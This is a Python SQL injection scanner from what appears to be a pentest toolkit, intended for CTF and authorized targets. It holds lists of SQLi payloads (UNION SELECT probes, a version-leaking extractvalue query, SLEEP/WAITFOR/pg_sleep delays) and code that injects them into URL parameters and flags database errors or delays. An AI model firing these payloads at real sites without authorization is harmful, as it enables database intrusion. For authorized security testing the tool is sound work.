#!/usr/bin/env python3
"""
web/sqli_tester.py — SQL injection detection for authorized CTF/pentest targets
NuRichter · CySec Arsenal

Tests for error-based, boolean-based, and time-based SQLi patterns.
Intended for use against intentionally vulnerable apps (DVWA, HackTheBox, CTF).

Usage:
    python web/sqli_tester.py -u "http://target.ctf/page?id=1"
    python web/sqli_tester.py -u "http://target.ctf/login" --data "user=admin&pass=test"
    python web/sqli_tester.py -u "http://target.ctf/page?id=1" --param id --level 3
"""
import argparse
import time
import sys
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from utils import ok, warn, err, info, found, get_logger

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)

log = get_logger("sqli_tester")

# ─── Payload sets by level ────────────────────────────────────────────────────
PAYLOADS = {
    "error": [
        "'", "''", "\"", "`", "\\",
        "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
        "' AND 1=2--", "1' ORDER BY 1--", "1' ORDER BY 10--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "boolean": [
        "' AND '1'='1", "' AND '1'='2",
        "1 AND 1=1", "1 AND 1=2",
        "' AND 1=1--", "' AND 1=2--",
    ],
    "time": [
        "'; WAITFOR DELAY '0:0:5'--",            # MSSQL
        "' AND SLEEP(5)--",                        # MySQL
        "'; SELECT pg_sleep(5)--",                # PostgreSQL
        "' OR SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
    ],
}

ERROR_SIGNATURES = [
    "sql syntax", "mysql", "ora-", "postgresql", "sqlite",
    "syntax error", "unclosed quotation", "unterminated string",
    "odbc", "jdbc", "mssql", "microsoft sql", "warning: mysql",
    "supplied argument is not a valid mysql", "division by zero",
    "quoted string not properly terminated",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; cysec-arsenal/1.0 CTF-scanner)"
}


class SQLiTester:
    def __init__(self, url: str, method: str = "GET", data: str = "",
                 param: str = "", timeout: float = 10.0, level: int = 1):
        self.url = url
        self.method = method.upper()
        self.post_data = dict(p.split("=", 1) for p in data.split("&") if "=" in p)
        self.target_param = param
        self.timeout = timeout
        self.level = level
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = False
        self.baseline = self._baseline()
        self.findings: list[dict] = []

    def _baseline(self) -> requests.Response | None:
        try:
            if self.method == "POST":
                return self.session.post(self.url, data=self.post_data,
                                         timeout=self.timeout)
            return self.session.get(self.url, timeout=self.timeout)
        except Exception as e:
            print(err(f"Baseline request failed: {e}"))
            return None

    def _request(self, url: str, data: dict) -> requests.Response | None:
        try:
            if self.method == "POST":
                return self.session.post(url, data=data, timeout=self.timeout + 6)
            return self.session.get(url, params=data, timeout=self.timeout + 6)
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            print(warn(f"Request error: {e}"))
            return None

    def _inject_url_param(self, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        new_query = urllib.parse.urlencode(qs)
        return parsed._replace(query=new_query).geturl()

    def _get_params(self) -> list[str]:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        params = list(qs.keys()) + list(self.post_data.keys())
        if self.target_param and self.target_param in params:
            return [self.target_param]
        return params

    def test_error_based(self, param: str) -> list[dict]:
        results = []
        payloads = PAYLOADS["error"] if self.level >= 2 else PAYLOADS["error"][:6]
        for payload in payloads:
            injected_url = self._inject_url_param(param, payload)
            resp = self._request(injected_url, {})
            if resp is None:
                continue
            text = resp.text.lower()
            for sig in ERROR_SIGNATURES:
                if sig in text:
                    msg = f"[ERROR-BASED] param={param} payload={repr(payload)} sig={sig!r}"
                    print(found(msg))
                    log.warning(msg)
                    results.append({"type": "error", "param": param,
                                    "payload": payload, "signature": sig})
                    break
        return results

    def test_time_based(self, param: str) -> list[dict]:
        results = []
        for payload in PAYLOADS["time"]:
            injected_url = self._inject_url_param(param, payload)
            t0 = time.time()
            self._request(injected_url, {})
            elapsed = time.time() - t0
            if elapsed >= 4.5:
                msg = f"[TIME-BASED] param={param} payload={repr(payload)} delay={elapsed:.1f}s"
                print(found(msg))
                log.warning(msg)
                results.append({"type": "time", "param": param,
                                 "payload": payload, "delay": elapsed})
        return results

    def run(self) -> list[dict]:
        params = self._get_params()
        if not params:
            print(warn("No GET/POST parameters detected."))
            return []

        print(info(f"Testing {len(params)} parameter(s): {params}"))
        print(info(f"Method: {self.method}  Level: {self.level}\n"))

        for param in params:
            print(info(f"Testing parameter: {param}"))
            self.findings.extend(self.test_error_based(param))
            if self.level >= 2:
                self.findings.extend(self.test_time_based(param))

        return self.findings


def main():
    parser = argparse.ArgumentParser(
        description="SQLi Tester (CTF/Authorized) — NuRichter CySec Arsenal"
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data", default="", help="POST data (url-encoded)")
    parser.add_argument("--param", default="", help="Specific parameter to test")
    parser.add_argument("--level", type=int, default=1, choices=[1, 2, 3],
                        help="Test intensity (1=basic, 2=time-based, 3=full)")
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f"  URL    : {args.url}")
    print(f"  METHOD : {args.method}  LEVEL: {args.level}")
    print(f"{'='*60}\n")

    tester = SQLiTester(
        url=args.url, method=args.method, data=args.data,
        param=args.param, timeout=args.timeout, level=args.level,
    )
    findings = tester.run()

    print(f"\n{'='*60}")
    if findings:
        print(found(f"{len(findings)} potential SQLi vector(s) detected!"))
    else:
        print(ok("No obvious SQLi patterns detected."))
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
